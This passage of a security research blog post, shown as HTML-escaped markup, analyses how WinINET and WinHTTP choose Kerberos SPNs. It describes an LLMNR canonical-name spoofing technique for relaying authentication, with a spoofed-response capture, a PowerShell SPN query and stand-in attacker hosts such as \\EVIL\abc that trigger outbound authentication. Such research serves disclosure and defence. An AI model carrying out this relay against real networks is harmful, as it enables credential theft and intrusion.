exhaustive list, and there&amp;#39;s likely to be many different HTTP clients in Windows which might have different behaviors. I&amp;#39;ve also not looked at how non-Windows clients work in this regard. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;There&amp;#39;s two important behaviors that I wanted to assess with HTTP. First is how the user agent determines when to perform automatic Windows authentication using the current user&amp;#39;s credentials. In order to relay the authentication it can&amp;#39;t ask the user for their credentials. And second we want to know how the SPN is selected by the user agent when calling &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.7drfeuxw9d9q\"&gt;&lt;span class=\"c31\"&gt;WinINET (Internet Explorer 11)&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/wininet/portal\"&gt;WinINET&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be used as a generic library to handle HTTP connections and authentication. There&amp;#39;s likely many different users of WinINET but we&amp;#39;ll just look at Internet Explorer 11 as that is what it&amp;#39;s most known for. WinINET is also the originator of HTTP &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;authentication&lt;/span&gt;&lt;span class=\"c3\"&gt;, so it&amp;#39;s good to get a baseline of what WinINET does in case other libraries just copied its behavior.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;First, how does WinINET determine when it should handle Windows authentication automatically? By default this is based on whether the target host is considered to be in the Intranet Zone. This means any host which bypasses the configured HTTP proxy or uses an undotted name will be considered Intranet zone and WinINET will automatically authenticate using the current user&amp;#39;s credentials.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;It&amp;#39;s possible to disable this behavior by changing the security options for the Intranet Zone to &amp;quot;Prompt for &lt;/span&gt;&lt;span&gt;user name&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;and password&amp;quot;, as shown below:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEi0PEBYNeQYyCFc_m0LHSgoGRsniCGYJYWXZuD4Ix1SXwSklWAhLmMg5NknUrJ7q4jAjDVhx0raXfmQXk9a3TPvJqUKT0pdcyNnv2h9KzFrhdJzQGmoHRFCCUhRfp0RexYbR9hkmu3SnPy5sBKjgUMsv5gZFka1gAv7evU_d5E7iQOPegQCv4c8360SmQ=s699\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEi0PEBYNeQYyCFc_m0LHSgoGRsniCGYJYWXZuD4Ix1SXwSklWAhLmMg5NknUrJ7q4jAjDVhx0raXfmQXk9a3TPvJqUKT0pdcyNnv2h9KzFrhdJzQGmoHRFCCUhRfp0RexYbR9hkmu3SnPy5sBKjgUMsv5gZFka1gAv7evU_d5E7iQOPegQCv4c8360SmQ=s699\" border=\"0\" alt=\"Screenshot of the system Internet Options Security Settings showing how to disable automatic authentication\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Next, how does WinINET determine the SPN to use for &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span class=\"c3\"&gt;authentication? RFC4559 says the following:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c25 c14 c4\"&gt;&amp;#39;When the Kerberos Version 5 GSSAPI mechanism [RFC4121] is being used, the HTTP server will be using a principal name of the form of &amp;quot;HTTP/hostname&amp;quot;&amp;#39;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;You might assume therefore that the HTTP URL that WinINET is connecting to would be sufficient to build the SPN: just use the hostname as provided and combine with the HTTP service class. However it turns out that&amp;#39;s not entirely the case. I found a rough description of how IE and WinINET actually generate the SPN in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/internet-explorer-behaviors-with-kerberos-authentication/ba-p/396428\"&gt;this blog&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;This blog post is over 10 years old so it was possible that things have changed, however it turns out to not be the case&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The basic approach is that WinINET doesn&amp;#39;t necessarily trust the hostname specified in the HTTP URL. Instead it requests the canonical name of the server via DNS. It doesn&amp;#39;t seem to explicitly request a CNAME record from the DNS server. Instead it calls &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo\"&gt;getaddrinfo&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and specifies the &lt;/span&gt;&lt;span class=\"c4\"&gt;AI_CANONNAME&lt;/span&gt;&lt;span&gt;&amp;nbsp;hint. Then it uses the returned value of &lt;/span&gt;&lt;span class=\"c4\"&gt;ai_canonname&lt;/span&gt;&lt;span&gt;&amp;nbsp;and prefixes it with the &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP&lt;/span&gt;&lt;span&gt;&amp;nbsp;service class&lt;/span&gt;&lt;span&gt;. In general &lt;/span&gt;&lt;span class=\"c4\"&gt;ai_canonname&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;is the name provided by the DNS server in the returned A/AAAA record.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;For example, if the HTTP URL is &lt;/span&gt;&lt;span class=\"c4\"&gt;http://fileserver.domain.com&lt;/span&gt;&lt;span&gt;, but the DNS A record contains the canonical name &lt;/span&gt;&lt;span class=\"c4\"&gt;example.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;the generated SPN is &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP/example.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;and not &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP/fileserver.domain.com&lt;/span&gt;&lt;span class=\"c3\"&gt;. Therefore to provide an arbitrary SPN you need to get the name in the DNS address record to differ from the IP address in that record so that IE will connect to a server we control while generating Kerberos authentication for a different target name.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The most obvious technique would be to specify a DNS CNAME record which redirects to another hostname. However, at least if the client is using a Microsoft DNS server (which is likely for a domain environment) then the CNAME record is not directly returned to the client. Instead the DNS server will perform a recursive lookup, and then return the CNAME along with the validated address record to the client. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Therefore, if an attacker sets up a CNAME record for &lt;/span&gt;&lt;span class=\"c4\"&gt;www.evil.com&lt;/span&gt;&lt;span&gt;, which redirects to &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;the DNS server will return the CNAME record and an address record for the real IP address of &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;. WinINET will try to connect to the HTTP service on &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than &lt;/span&gt;&lt;span class=\"c4\"&gt;www.evil.com&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;which is what is needed for the attack to function.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;I tried various ways of tricking the DNS client into making a direct request to a DNS server I controlled but I couldn&amp;#39;t seem to get it to work. However, it turns out there is a way to get the DNS resolver to accept arbitrary DNS responses, via local DNS resolution protocols such as &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/rfc6762\"&gt;Multicast DNS (MDNS)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://datatracker.ietf.org/doc/html/rfc4795\"&gt;Link-Local Multicast Name Resolution (LLMNR)&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;These two protocols use a lightly modified DNS packet structure, so you can return a response to the name resolution request with an address record with the IP address of the malicious web server, but the canonical name of any server. WinINET will then make the HTTP connection to the malicious web server but construct the SPN for the spoofed canonical name. I&amp;#39;ve verified this with LLMNR and in theory MDNS should work as well.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Is spoofing the canonical name a bug in the Windows DNS client resolver? I don&amp;#39;t believe any DNS protocol requires the query name to exactly match the answer name. If the DNS server has a CNAME record for the queried host then there&amp;#39;s no obvious requirement for it to return that record when it could just return the address record. Of course if a public DNS server could spoof a host for a DNS zone which it didn&amp;#39;t control, that&amp;#39;d be a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://www.cs.cornell.edu/~shmat/shmat_securecomm10.pdf\"&gt;serious security issue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. It&amp;#39;s also worth noting that this doesn&amp;#39;t spoof the name generally. As the cached DNS entry on Windows is based on the query name, if the client now resolves &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver.domain.com&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;a new DNS request will be made and the DNS server would return the real address.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Attacking local name resolution protocols is a well known weakness abused for MitM attacks, so it&amp;#39;s likely that some security conscious networks will disable the protocols. However, the advantage of using LLMNR this way over its use for MitM is that the resolved name can be anything. As in, normally you&amp;#39;d want to spoof the DNS name of an existing host, in our example you&amp;#39;d spoof the request for the &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;name. But for registered computers on the network the DNS client will usually satisfy the name resolution via the network&amp;#39;s DNS server before ever trying local DNS resolution. Therefore local DNS resolution would never be triggered and it wouldn&amp;#39;t be possible to spoof it. For relaying Kerberos authentication we don&amp;#39;t care, you can induce a client to connect to an unregistered host name which will fallback to local DNS resolution.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The big problem with the local DNS resolution attack vector is that the attacker must be in the same multicast domain as the victim computer. However, the attacker can still start the process by getting a user to connect to an external domain which looks legitimate then redirect to an undotted name to both force automatic authentication and local DNS resolving.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEjm2PtQTZlQobqpEmVuy_72dJbu90cytEZH8jKN3ZwLkCzOMKQa0Rwfk0FVqKaPu5fyDimYp_gWkAxJHjdZU45OIVRD3EiPE_sd1jEmTCTLtPgMz96bHOM6SQrTPx7OJt3A3O65vdC1lRtF3y8pKchdwcst1J7oJCMIFb_PMGOcvy9CFEKz6Y3vbMTZ9g=s877\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEjm2PtQTZlQobqpEmVuy_72dJbu90cytEZH8jKN3ZwLkCzOMKQa0Rwfk0FVqKaPu5fyDimYp_gWkAxJHjdZU45OIVRD3EiPE_sd1jEmTCTLtPgMz96bHOM6SQrTPx7OJt3A3O65vdC1lRtF3y8pKchdwcst1J7oJCMIFb_PMGOcvy9CFEKz6Y3vbMTZ9g=s877\" border=\"0\" alt=\"Diagram of the local DNS resolving attack against WinINET\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;To summarize the attack process as shown in the above diagram:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c24 lst-kix_i2wckd3yhfhe-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;The attacker sets up an LLMNR service on a machine in the same multicast domain at the victim computer. The attacker listens for a target name request such as &lt;/span&gt;&lt;span class=\"c4\"&gt;EVILHOST&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;Trick the victim to use IE (or another WinINET client, such as via a document format like DOCX) to connect to the attacker&amp;#39;s server on &lt;/span&gt;&lt;span class=\"c4\"&gt;http://EVILHOST&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;The LLMNR server receives the lookup request and responds by setting the address record&amp;#39;s hostname to the SPN target host to spoof and the IP address to the attacker-controlled server.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;The WinINET client extracts the spoofed canonical name, appends the &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP &lt;/span&gt;&lt;span class=\"c3\"&gt;service class to the SPN and requests the Kerberos service ticket. This Kerberos ticket is then sent to the attacker&amp;#39;s HTTP service.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c3\"&gt;The attacker receives the Negotiate/Kerberos authentication for the spoofed SPN and relays it to the real target server.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;An example LLMNR response decoded by Wireshark for the name &lt;/span&gt;&lt;span class=\"c4\"&gt;evilhost&lt;/span&gt;&lt;span&gt;&amp;nbsp;(with IP address 10.0.0.80), spoofing &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which is &lt;/span&gt;&lt;span class=\"c4\"&gt;not &lt;/span&gt;&lt;span class=\"c3\"&gt;address 10.0.0.80) is shown below:&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b649351b399dcc493def89e3b9168ea435d7a3e3\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;Link-local Multicast Name Resolution (response)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Transaction ID: 0x910f&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Flags: 0x8000 Standard query response, No error&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Questions: 1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Answer RRs: 1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Authority RRs: 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Additional RRs: 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Queries&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; evilhost: type A, class IN&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Name: evilhost&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [Name Length: 8]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c4 c14\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [Label Count: 1]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Type: A (Host Address) (1)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Class: IN (0x0001)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; Answers&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fileserver.domain.com: type A, class IN, addr 10.0.0.80&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Name: fileserver.domain.com&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Type: A (Host Address) (1)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Class: IN (0x0001)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Time to live: 1 (1 second)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c12 c14 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Data length: 4&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4 c42\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Address: 10.0.0.80&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;You might assume that the SPN always having the &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP &lt;/span&gt;&lt;span&gt;service class would be a problem. However, the Active Directory default SPN mapping will map &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP &lt;/span&gt;&lt;span&gt;to the &lt;/span&gt;&lt;span class=\"c4\"&gt;HOST &lt;/span&gt;&lt;span class=\"c3\"&gt;service class which is always registered. Therefore you can target any domain joined system without needing to register an explicit SPN. As long as the receiving service doesn&amp;#39;t then verify the SPN it will work to authenticate to the computer account, which is used by privileged services. You can use the following PowerShell script to list all the configured SPN mappings in a domain.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.28ed80520ca46d9c5e76e6e7185f42f9102dbf8d\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=\"c2 c23\"&gt;$base_dn&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c17\"&gt;=&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;Get-ADRootDSE&lt;/span&gt;&lt;span class=\"c2\"&gt;)&lt;/span&gt;&lt;span class=\"c2 c17\"&gt;.&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;configurationNamingContext&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class=\"c2 c23\"&gt;$dn&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c17\"&gt;=&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c27\"&gt;&amp;quot;CN=Directory Service,CN=Windows NT,CN=Services,&lt;/span&gt;&lt;span class=\"c2 c23\"&gt;$base_dn&lt;/span&gt;&lt;span class=\"c2 c27\"&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;PS&amp;gt; (&lt;/span&gt;&lt;span class=\"c2 c13\"&gt;Get-ADObject&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c23\"&gt;$dn&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c34\"&gt;-Properties&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c2 c35\"&gt;sPNMappings&lt;/span&gt;&lt;span class=\"c2\"&gt;)&lt;/span&gt;&lt;span class=\"c2 c17\"&gt;.&lt;/span&gt;&lt;span class=\"c6 c2\"&gt;sPNMappings&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;One interesting behavior of WinINET is that it always requests &lt;/span&gt;&lt;span class=\"c4\"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;delegation, although that will only be useful if the SPN&amp;#39;s target account is registered for delegation. I couldn&amp;#39;t convince WinINET to default to a Kerberos only mode; sending back a &lt;/span&gt;&lt;span class=\"c4\"&gt;WWW-Authenticate: Kerberos&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;header causes the authentication process to stop. This means the Kerberos AP_REQ will always have Integrity enabled even though the user agent doesn&amp;#39;t explicitly request it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Another user of WinINET is Office. For example you can set a template located on an HTTP URL which will generate local Windows authentication if in the Intranet zone just by opening a Word document. This is probably a good vector for getting the authentication started rather than relying on Internet Explorer being available.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;WinINET does have some &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537164(v=vs.85)\"&gt;feature controls&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which can be enabled on a per-executable basis which affect the behavior of the SPN lookup process, specifically &lt;/span&gt;&lt;span class=\"c4\"&gt;FEATURE_USE_CNAME_FOR_SPN_KB911149&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;and &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;FEATURE_ALWAYS_USE_DNS_FOR_SPN_KB3022771&lt;/span&gt;&lt;span class=\"c3\"&gt;. However these only seem to come into play if the HTTP connection is being proxied, which we&amp;#39;re assuming isn&amp;#39;t the case.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.8vgvwmfq3mv1\"&gt;&lt;span class=\"c31\"&gt;WinHTTP (WebDAV WebClient)&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/winhttp/about-winhttp\"&gt;WinHTTP library&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an alternative to using WinINET in a client application. It&amp;#39;s a cleaner API and doesn&amp;#39;t have the baggage of being used in Internet Explorer. As an example client I chose to use the built-in WebDAV WebClient service because it gives the interesting property that it converts a UNC file name request into a potentially exploitable HTTP request. If the WebClient service is installed and running then opening a file of the form &lt;/span&gt;&lt;span class=\"c4\"&gt;\\\\EVIL\\abc&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;will cause an HTTP request to be sent out to a server under the attacker&amp;#39;s control.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;From what I can tell the behavior of WinHTTP when used with the WebClient service is almost exactly the same as for WinINET. I could exploit the SPN generation through local DNS resolution, but not from a public DNS name record. WebDAV seems to consider undotted names to be Intranet zone, however the default for WinHTTP seems to depend on whether the connection would bypass the proxy. The automatic authentication decision is based on the value of the &lt;/span&gt;&lt;span 